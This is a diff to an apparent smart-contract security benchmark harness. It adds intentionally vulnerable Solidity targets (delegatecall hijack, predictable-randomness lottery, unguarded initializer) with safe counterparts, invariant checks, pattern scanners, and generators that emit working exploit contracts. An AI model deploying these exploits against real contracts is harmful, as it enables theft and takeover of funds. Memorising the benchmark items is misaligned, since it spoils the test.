@@ -223,6 +223,204 @@ TARGETS = {
     "max_attempts": 5
    }
   }
+ },
+ "DelegateVault": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice A \"modular\" vault that lets callers plug in behaviour by\n/// delegatecalling an arbitrary module address they supply. Because the\n/// module runs in THIS contract's storage context, a malicious module can\n/// overwrite `owner` (storage slot 0). Modelled on Ethernaut Delegation /\n/// Preservation and the Parity multisig delegatecall class.\ncontract DelegateVault {\n    address public owner;      // slot 0\n    uint256 public deposits;   // slot 1\n\n    constructor() payable {\n        owner = address(0xA11CE);\n    }\n\n    /// @dev VULNERABLE: module address is fully attacker-controlled and is\n    /// invoked with delegatecall, so its code mutates DelegateVault storage.\n    function execute(address module, bytes calldata data) external {\n        (bool ok, ) = module.delegatecall(data);\n        require(ok, \"module call failed\");\n    }\n\n    function deposit() external payable {\n        deposits += msg.value;\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice true = property holds (healthy), false = violated.\ninterface IOwned { function owner() external view returns (address); }\n\ncontract Invariants {\n    address constant INITIAL_OWNER = address(0xA11CE);\n\n    /// @notice Ownership must remain with the address set at construction.\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IOwned(target).owner() == INITIAL_OWNER;\n    }\n\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "DelegateVault",
+    "src": "src/DelegateVault.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "1000000000000000000"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "ownerUnchanged"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 6
+   }
+  }
+ },
+ "PredictableLottery": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice A lottery whose \"random\" winning number is derived entirely from\n/// on-chain block fields readable by any caller in the SAME transaction.\n/// An attacker computes the identical value and always wins. Modelled on\n/// Ethernaut CoinFlip and Capture-the-Ether \"Predict the Future\".\ncontract PredictableLottery {\n    constructor() payable {}\n\n    /// @dev VULNERABLE: entropy source is block.timestamp/prevrandao/number,\n    /// all known to the caller before they pick `guess`.\n    function play(uint256 guess) external payable {\n        require(msg.value == 1 ether, \"ante is 1 ether\");\n        uint256 lucky = uint256(\n            keccak256(abi.encodePacked(block.timestamp, block.prevrandao, block.number))\n        ) % 100;\n        if (guess == lucky) {\n            (bool ok, ) = msg.sender.call{value: 5 ether}(\"\");\n            require(ok, \"payout failed\");\n        }\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ncontract Invariants {\n    uint256 constant SEED = 20 ether;\n    /// @notice The house must always retain at least its seeded float. A\n    /// fair game nets to zero for the house; only a predictable-RNG drain\n    /// can push it below the seed.\n    function houseSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!houseSolvent(target)) return (false, \"houseSolvent\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "PredictableLottery",
+    "src": "src/PredictableLottery.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "20000000000000000000"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "houseSolvent"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 6
+   }
+  }
+ },
+ "OpenInitializer": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice A logic contract whose admin slot is left uninitialized at\n/// construction and can be claimed by ANYONE via an unguarded initializer.\n/// Modelled on Ethernaut Motorbike (uninitialized UUPS) and the broad class\n/// of proxy contracts deployed without initialize() being locked.\ncontract OpenInitializer {\n    address public admin;   // slot 0 \u2014 starts as address(0)\n\n    constructor() payable {}\n\n    /// @dev VULNERABLE: no `initialized` guard, no access control. The first\n    /// caller becomes admin.\n    function initialize() external {\n        admin = msg.sender;\n    }\n\n    /// @dev Once admin, sweep the whole balance.\n    function sweep(address payable to) external {\n        require(msg.sender == admin, \"not admin\");\n        (bool ok, ) = to.call{value: address(this).balance}(\"\");\n        require(ok, \"sweep failed\");\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ninterface IAdmin { function admin() external view returns (address); }\n\ncontract Invariants {\n    /// @notice The admin slot must remain uninitialized until the legitimate\n    /// deployer claims it. Any other address seizing it is a takeover.\n    function adminUninitialized(address target) public view returns (bool) {\n        return IAdmin(target).admin() == address(0);\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!adminUninitialized(target)) return (false, \"adminUninitialized\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "OpenInitializer",
+    "src": "src/OpenInitializer.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "1000000000000000000"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "adminUninitialized"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 6
+   }
+  }
+ },
+ "LibraryVault": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice Fixed logic module \u2014 no function can write the vault's owner slot.\ncontract Logic {\n    uint256 public pings; // slot 0 here, but only ever bumped, never owner\n    function ping() external { pings += 1; }\n}\n\n/// @notice SAFE counterpart to DelegateVault. It also uses delegatecall, but\n/// only ever to an IMMUTABLE module fixed at construction. Callers cannot\n/// point it at attacker code, so ownership cannot be hijacked.\ncontract LibraryVault {\n    address public owner;             // slot 0\n    address public immutable module;  // immutable \u2192 not attacker-controlled\n\n    constructor() payable {\n        owner = address(0xA11CE);\n        module = address(new Logic());\n    }\n\n    /// @dev delegatecall target is the fixed `module`, never a parameter.\n    function run(bytes calldata data) external {\n        (bool ok, ) = module.delegatecall(data);\n        require(ok, \"module call failed\");\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ninterface IOwned { function owner() external view returns (address); }\n\ncontract Invariants {\n    address constant INITIAL_OWNER = address(0xA11CE);\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IOwned(target).owner() == INITIAL_OWNER;\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "LibraryVault",
+    "src": "src/LibraryVault.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "1000000000000000000"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "ownerUnchanged"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 6
+   }
+  }
+ },
+ "CommitLottery": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice SAFE counterpart to PredictableLottery. The winning condition is a\n/// pre-committed secret hash, NOT any block field. A caller cannot derive the\n/// secret from on-chain state within the transaction, so there is no\n/// predictable-RNG edge to exploit (commit-reveal pattern).\ncontract CommitLottery {\n    // Hash of the house's secret, fixed at deploy. Preimage is off-chain.\n    bytes32 public constant COMMITMENT =\n        0x9d3e2b1f4c7a86d05e21bb90f7c4c0a3d8e6f1b2c9a4d7e0f3b6c1a2d5e8f0b7;\n\n    constructor() payable {}\n\n    /// @dev No block.timestamp / prevrandao / blockhash anywhere: the payout\n    /// gate is a hash preimage check, unpredictable on-chain.\n    function claim(uint256 secret) external {\n        require(keccak256(abi.encodePacked(secret)) == COMMITMENT, \"wrong secret\");\n        (bool ok, ) = msg.sender.call{value: 5 ether}(\"\");\n        require(ok, \"payout failed\");\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ncontract Invariants {\n    uint256 constant SEED = 20 ether;\n    function houseSolvent(address target) public view returns (bool) {\n        return target.balance >= SEED;\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!houseSolvent(target)) return (false, \"houseSolvent\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "CommitLottery",
+    "src": "src/CommitLottery.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "20000000000000000000"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "houseSolvent"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 6
+   }
+  }
+ },
+ "GuardedInitializer": {
+  "src": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\n/// @notice SAFE counterpart to OpenInitializer. The initializer is locked with\n/// an `initialized` flag and is invoked in the constructor by the deployer, so\n/// no later caller can re-run it to seize admin.\ncontract GuardedInitializer {\n    address public admin;      // slot 0\n    bool private initialized;  // slot 1\n\n    constructor() payable {\n        _init(address(0xA11CE));\n    }\n\n    function initialize(address who) external {\n        _init(who);\n    }\n\n    function _init(address who) internal {\n        require(!initialized, \"already initialized\");\n        initialized = true;\n        admin = who;\n    }\n\n    function sweep(address payable to) external {\n        require(msg.sender == admin, \"not admin\");\n        (bool ok, ) = to.call{value: address(this).balance}(\"\");\n        require(ok, \"sweep failed\");\n    }\n\n    receive() external payable {}\n}\n",
+  "inv": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.24;\n\ninterface IAdmin { function admin() external view returns (address); }\n\ncontract Invariants {\n    address constant INITIAL_ADMIN = address(0xA11CE);\n    function ownerUnchanged(address target) public view returns (bool) {\n        return IAdmin(target).admin() == INITIAL_ADMIN;\n    }\n    function checkAll(address target) external view returns (bool allHold, string memory firstViolated) {\n        if (!ownerUnchanged(target)) return (false, \"ownerUnchanged\");\n        return (true, \"\");\n    }\n}\n",
+  "manifest": {
+   "schema": "trust404.track04.manifest/0.1",
+   "target": {
+    "name": "GuardedInitializer",
+    "src": "src/GuardedInitializer.sol",
+    "solc": "0.8.24",
+    "evm_version": "cancun"
+   },
+   "deploy": {
+    "mode": "local",
+    "constructor_args": [],
+    "value_wei": "1000000000000000000"
+   },
+   "determinism": {
+    "block_number": 21000000,
+    "block_timestamp": 1735689600,
+    "seed": 42
+   },
+   "invariants": {
+    "contract": "Invariants.sol",
+    "predicates": [
+     "ownerUnchanged"
+    ]
+   },
+   "budget": {
+    "timeout_sec": 300,
+    "max_attempts": 6
+   }
+  }
  }
 }
 
@@ -235,6 +433,10 @@ FAM_REENTRANCY = "reentrancy"
 FAM_ACCESS = "access_control"
 FAM_INTEGER = "integer_underflow"
 FAM_ORACLE = "oracle_manipulation"
+FAM_DELEGATECALL = "delegatecall_hijack"
+FAM_RANDOMNESS = "weak_randomness"
+FAM_INIT = "unprotected_init"
+_ENTROPY_TOKENS = ("block.timestamp","block.prevrandao","block.difficulty","block.number","blockhash","block.coinbase","block.gaslimit",)
 
 
 def _strip_comments(src):
@@ -305,7 +507,10 @@ def _has_owner_guard(fn, src):
 def scan_target(contract_src, invariants_src, manifest):
     src = _strip_comments(contract_src)
     fns = _functions(src)
-    scores = {FAM_REENTRANCY: 0, FAM_ACCESS: 0, FAM_INTEGER: 0, FAM_ORACLE: 0}
+    scores = {
+        FAM_REENTRANCY: 0, FAM_ACCESS: 0, FAM_INTEGER: 0, FAM_ORACLE: 0,
+        FAM_DELEGATECALL: 0, FAM_RANDOMNESS: 0, FAM_INIT: 0,
+    }
     sig = {"functions": fns}
 
     # ── Reentrancy ────────────────────────────────────────────────────────────
@@ -379,6 +584,70 @@ def scan_target(contract_src, invariants_src, manifest):
         if re.match(r"swap\w*For\w*", fn["name"] or ""):
             sig["oracle_swap"] = fn
 
+    # ── Delegatecall hijack ───────────────────────────────────────────────────
+    # A function that delegatecalls an address it received as a PARAMETER runs
+    # attacker code in this contract's storage → owner/admin (slot 0) can be
+    # overwritten. Delegatecall to an immutable/state module is not attacker-
+    # controlled and is not flagged (LibraryVault stays safe).
+    for fn in fns:
+        if not fn["external"]:
+            continue
+        b = fn["body"]
+        m = re.search(r"(\w+)\s*\.\s*delegatecall\s*\(", b)
+        if not m:
+            continue
+        receiver = m.group(1)
+        addr_params = [an for (t, an) in fn["args"] if t == "address"]
+        has_bytes = any(t.startswith("bytes") for t, _ in fn["args"])
+        if receiver in addr_params:
+            # attacker supplies the delegatecall target
+            scores[FAM_DELEGATECALL] += 5
+            sig["delegatecall_entry"] = {"fn": fn, "receiver": receiver, "has_bytes": has_bytes}
+        # receiver is a state var / immutable → not attacker-controlled → no score
+
+    # ── Weak / predictable randomness ─────────────────────────────────────────
+    # A payout gated on an on-chain entropy source the caller can read in the
+    # same tx is exploitable: the attacker computes the identical value and
+    # always wins. Require (entropy source) AND (keccak256 or modulo mixing)
+    # AND (a value transfer) in the same function, so a mere block.timestamp
+    # deadline check does not trip it.
+    for fn in fns:
+        if not fn["external"]:
+            continue
+        b = fn["body"]
+        has_entropy = any(tok in b for tok in _ENTROPY_TOKENS)
+        mixes = ("keccak256" in b) or ("%" in b)
+        transfers = bool(re.search(r"\.call\s*\{\s*value\s*:", b)) or \
+            bool(re.search(r"balance[sfO]?\w*\[[^\]]+\]\s*\+=", b))
+        if has_entropy and mixes and transfers:
+            scores[FAM_RANDOMNESS] += 5
+            sig["randomness_fn"] = fn
+
+    # ── Unprotected initializer ───────────────────────────────────────────────
+    # An initializer that sets owner/admin with neither an `initialized` guard
+    # nor access control lets the first caller seize the contract. A guarded
+    # initializer (require(!initialized) / initializer modifier) is safe.
+    init_name = re.compile(r"^(initialize|init|initializer|__init)\w*$", re.I)
+    for fn in fns:
+        if not fn["external"]:
+            continue
+        b = fn["body"]
+        head = fn["head"]
+        looks_init = bool(init_name.match(fn["name"]))
+        sets_privilege_to_sender = bool(
+            re.search(r"\b(owner|admin)\b\s*=\s*msg\.sender", b))
+        sets_privilege_to_param = bool(
+            re.search(r"\b(owner|admin)\b\s*=\s*\w+", b)) and looks_init
+        guarded = bool(
+            re.search(r"require\s*\(\s*!\s*\w*[Ii]nitialized", b)
+            or re.search(r"\binitializer\b", head)
+            or "_disableInitializers" in src
+            or _has_owner_guard(fn, src))
+        if (looks_init or sets_privilege_to_sender) and \
+           (sets_privilege_to_sender or sets_privilege_to_param) and not guarded:
+            scores[FAM_INIT] += 5
+            sig["init_fn"] = fn
+
     sig["scores"] = scores
     sig["invariant_predicates"] = manifest.get("invariants", {}).get("predicates", [])
     return sig
@@ -390,7 +659,7 @@ def scan_target(contract_src, invariants_src, manifest):
 # 못 찾으면 이 트랙 공개셋의 관례적 이름으로 폴백한다.
 
 
-STRATEGY_ORDER = [FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE]
+STRATEGY_ORDER = [FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE, FAM_DELEGATECALL, FAM_RANDOMNESS, FAM_INIT]
 
 HEADER = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"
 
@@ -427,6 +696,12 @@ def build_exploit(fam, findings):
         return _integer(findings)
     if fam == FAM_ORACLE:
         return _oracle(findings)
+    if fam == FAM_DELEGATECALL:
+        return _delegatecall(findings)
+    if fam == FAM_RANDOMNESS:
+        return _randomness(findings)
+    if fam == FAM_INIT:
+        return _init(findings)
     return None
 
 
@@ -581,6 +856,155 @@ def _oracle(findings):
     )
     return HEADER + body
 
+
+
+def _delegatecall(findings):
+    """Ethernaut Delegation/Preservation class: the target delegatecalls an
+    attacker-supplied module, so a module that writes storage slot 0 seizes
+    `owner`/`admin`. We deploy such a module and route the target through it."""
+    entry = findings.get("delegatecall_entry")
+    if not entry or not entry.get("has_bytes"):
+        return None
+    name = entry["fn"]["name"]
+    # Reconstruct the entry signature: (address <recv>, bytes <data>) in the
+    # order they were declared, so we call it exactly as the target expects.
+    args = entry["fn"]["args"]
+    parts = []
+    call_args = []
+    for typ, _an in args:
+        if typ == "address":
+            parts.append("address")
+            call_args.append("address(pwn)")
+        elif typ.startswith("bytes"):
+            parts.append("bytes calldata")  # reference type needs a data location
+            call_args.append('abi.encodeWithSignature("hijack()")')
+        elif typ.startswith("uint"):
+            parts.append("uint256")
+            call_args.append("0")
+        else:
+            parts.append(typ)
+            call_args.append("0")
+    sig_types = ",".join(parts)
+    call = f"        t.{name}({', '.join(call_args)});"
+    body = (
+        "// Strategy: delegatecall hijack — the target delegatecalls a module\n"
+        "// we control, so our module runs in the target's storage context and\n"
+        "// overwrites slot 0 (owner/admin). No import needed.\n"
+        "interface ITarget {\n"
+        f"    function {name}({sig_types}) external;\n"
+        "}\n\n"
+        "contract Pwn {\n"
+        "    // slot 0 aligns with the target's owner/admin slot under delegatecall\n"
+        "    address public slot0;\n"
+        "    function hijack() external { slot0 = msg.sender; }\n"
+        "}\n\n"
+        "contract Exploit {\n"
+        "    function run(address _t) external payable {\n"
+        "        ITarget t = ITarget(_t);\n"
+        "        Pwn pwn = new Pwn();\n"
+        f"{call}\n"
+        "    }\n"
+        "    receive() external payable {}\n"
+        "}\n"
+    )
+    return HEADER + body
+
+
+def _randomness(findings):
+    """Ethernaut CoinFlip / Capture-the-Ether Predict-the-Future class: the
+    payout is gated on block entropy the caller can read in the same tx. We
+    replicate the exact mixing expression and always submit the winning value,
+    looping until the house float is drained below its solvency floor."""
+    fn = findings.get("randomness_fn")
+    if not fn:
+        return None
+    name = fn["name"]
+    b = fn["body"]
+    # Reproduce the target's own entropy expression verbatim so the computed
+    # value is identical (block.* globals resolve the same inside Exploit).
+    # Capture the full right-hand side of the entropy-bearing assignment up to
+    # its terminating ';' — this keeps nested parentheses balanced and picks up
+    # any trailing `% N` mixing without brittle sub-parsing.
+    rhs = re.search(r"=\s*([^;]*(?:block\.|blockhash)[^;]*?)\s*;", b, re.S)
+    if rhs:
+        rand_expr = rhs.group(1).strip()
+    else:
+        # fall back to a common predictable source
+        rand_expr = "uint256(blockhash(block.number - 1))"
+    ante_m = re.search(r"msg\.value\s*==\s*(\d+)\s*ether", b)
+    ante = f"{ante_m.group(1)} ether" if ante_m else "1 ether"
+    payout_m = re.search(r"call\s*\{\s*value\s*:\s*(\d+)\s*ether", b)
+    payout = f"{payout_m.group(1)} ether" if payout_m else "1 ether"
+    # match the guess parameter type (default uint256)
+    guess_type = "uint256"
+    for typ, _an in fn["args"]:
+        if typ.startswith("uint") or typ == "bool":
+            guess_type = "uint256" if typ.startswith("uint") else "bool"
+            break
+    if guess_type == "bool":
+        pick = f"(({rand_expr}) == 1)"
+        param = "bool"
+    else:
+        pick = f"({rand_expr})"
+        param = "uint256"
+    body = (
+        "// Strategy: weak randomness — the payout is decided by block entropy\n"
+        "// the caller can read in the same transaction. We compute the exact\n"
+        "// same value and submit it as our guess, draining the house float.\n"
+        "interface ITarget {\n"
+        f"    function {name}({param} guess) external payable;\n"
+        "}\n\n"
+        "contract Exploit {\n"
+        f"    uint256 constant ANTE = {ante};\n"
+        f"    uint256 constant PAYOUT = {payout};\n"
+        "    function run(address _t) external payable {\n"
+        "        ITarget t = ITarget(_t);\n"
+        "        for (uint256 i = 0; i < 64; i++) {\n"
+        "            if (_t.balance < PAYOUT) break;\n"
+        f"            {param} guess = {pick};\n"
+        f"            t.{name}{{value: ANTE}}(guess);\n"
+        "        }\n"
+        "    }\n"
+        "    receive() external payable {}\n"
+        "}\n"
+    )
+    return HEADER + body
+
+
+def _init(findings):
+    """Ethernaut Motorbike / uninitialized-proxy class: an initializer with no
+    `initialized` guard and no access control lets the first caller take the
+    admin/owner slot. We simply call it and become the privileged account."""
+    fn = findings.get("init_fn")
+    if not fn:
+        return None
+    name = fn["name"]
+    addr_args = [a for a in fn["args"] if a[0] == "address"]
+    if addr_args:
+        iface = f"    function {name}(address) external;"
+        call = f"        t.{name}(address(this));"
+    elif fn["args"]:
+        # unexpected arity — fall back to no-arg attempt guarded by interface
+        iface = f"    function {name}() external;"
+        call = f"        t.{name}();"
+    else:
+        iface = f"    function {name}() external;"
+        call = f"        t.{name}();"
+    body = (
+        "// Strategy: unprotected initializer — the admin/owner slot is left\n"
+        "// claimable, so we call the open initializer and seize it.\n"
+        "interface ITarget {\n"
+        f"{iface}\n"
+        "}\n\n"
+        "contract Exploit {\n"
+        "    function run(address _t) external payable {\n"
+        "        ITarget t = ITarget(_t);\n"
+        f"{call}\n"
+        "    }\n"
+        "    receive() external payable {}\n"
+        "}\n"
+    )
+    return HEADER + body
 
 
 def _ensure_solc():
